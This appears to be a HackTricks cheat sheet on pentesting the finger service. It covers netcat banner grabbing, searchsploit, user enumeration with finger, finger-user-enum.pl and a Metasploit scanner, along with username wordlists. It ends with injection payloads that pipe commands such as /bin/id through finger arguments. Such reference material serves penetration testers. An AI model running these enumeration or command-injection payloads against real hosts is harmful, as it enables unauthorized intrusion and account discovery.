https://hacktricks.boitatech.com.br/pentesting/pentesting-finger
#### Enumerate
Banner Grabbing
```bash
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

Search for exploits
```bash
searchsploit <ver>
```

User Enumeration
```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user

# Automated
finger-user-enum.pl -U users.txt -t <target>
finger-user-enum.pl -u root -t <target>

# Wordlists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Metasploit
```msfconsole
use auxiliary/scanner/finger/finger_users
```


#### Command Execution
```bash
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```
